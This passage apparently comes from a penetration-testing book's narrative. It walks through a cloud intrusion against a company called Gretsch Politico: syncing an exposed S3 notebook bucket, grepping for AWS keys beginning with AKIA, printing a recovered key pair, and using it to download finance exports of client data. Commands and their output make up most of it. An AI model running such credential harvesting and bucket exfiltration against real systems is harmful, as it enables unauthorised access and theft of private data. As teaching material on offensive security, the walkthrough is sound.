Let’s sync the whole bucket and begin to look for some AWS credentials. All AWS access key IDs start with the magic word AKIA, so we grep for that term:

```
root@Point1:~# aws s3 sync s3://gretsch-notebooks ./notebooks

root@Point1:~notebooks// # grep -R "AKIA" -4 *
yuka/Conversion model/... awsKeyOpt =
Some("\AKIAASJACEDYAZYWJMGDS\")\n",
yuka/Conversion model/... awsSecretOpt =
Some("\3ceq43SGCmTYkkiZkGrF7dr0Lssxdakymtoi14OSQ\")\n",
--snip--
```

Well, how about that! We collect dozens of personal AWS credentials, probably belonging to the whole data department of Gretsch Politico.

Let’s also search for occurrences of the common S3 drivers used in Spark, s3a and s3n, and uncover some precious S3 buckets regularly used to load data and conduct experiments:

```
root@Point1:~notebooks// # egrep -R "s3[a|n]://" *
① s3a://gretsch-finance/portfolio/exports/2019/03/ report1579446047119.csv
s3a://gretsch-hadoop/engine/aft-perf/...
s3a://gretsch-hadoop-us1/nj/media/engine/clickthrough/...
s3a://gretsch-hadoop-eu1/de/social/profiles/mapping/...
--snip--
```

Look at that first bucket’s name: gretsch-finance ①. That ought to be fun. We’ll use one of the AWS keys we retrieved from the same notebook and unload the keys under portfolio/exports/2020:

```
root@Point1:~# aws s3 sync \
s3://gretsch-finance/portfolio/exports/2020/ ./exports_20/ --profile data1

root@Point1:~# ls exports_20/
./01/report1548892800915.csv
./02/report1551319200454.csv
./03/report1551578400344.csv
./04/report1553997600119.csv
--snip--
```

Let’s sample a random file:

```
root@Point1:~# head ./03/report1551578400344.csv
annual revenue, last contact, initial contact, country, account,
zip code, service purchased, ...
0.15, 20191204, 20180801, FRW nation, BR, 13010, 5...
.11, 20200103, 20170103, RPU, US, 1101, 0...
```

That’s a list of clients, all right! We get not only current customers, but prospective ones as well. Details include when they were last approached, where, by whom, what the last service they purchased was, and how much they spent on the platform.